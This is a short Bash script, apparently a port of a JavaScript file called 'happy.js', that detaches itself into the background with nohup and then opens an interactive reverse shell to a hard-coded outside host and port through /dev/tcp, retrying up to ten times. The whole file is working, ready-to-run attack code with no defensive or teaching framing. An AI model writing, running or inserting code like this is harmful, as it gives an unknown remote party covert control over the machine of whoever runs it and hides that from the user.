#!/bin/bash

# This script is a Bash version of happy.js.
# It relaunches itself as a background process to free up the terminal,
# and then establishes a reverse shell with retry logic.

HOST="back-wr.gl.at.ply.gg"
PORT=56262
MAX_RETRIES=10
RETRY_INTERVAL=5 # 5 seconds

# The main logic for the reverse shell connection.
connect() {
    local retries=0
    while [ $retries -lt $MAX_RETRIES ]; do
        # Attempt to create a reverse shell.
        /bin/bash -i >& "/dev/tcp/${HOST}/${PORT}" 0>&1

        # If the connection closes, increment retries and wait before trying again.
        retries=$((retries + 1))
        sleep $RETRY_INTERVAL
    done
}

# Check for the --background argument to determine if this is the parent or child.
if [ "$1" == "--background" ]; then
    # --- BACKGROUND PROCESS ---
    # This is the child process that runs the actual reverse shell.
    connect
else
    # --- PARENT PROCESS ---
    # This process launches the child in the background and then exits.

    # Relaunch the script with the --background argument.
    # The '&' runs the process in the background.
    # nohup ensures the process isn't terminated when the terminal closes.
    nohup /bin/bash "$0" --background > /dev/null 2>&1 &

    # The parent process exits, freeing up the terminal.
    exit 0
fi
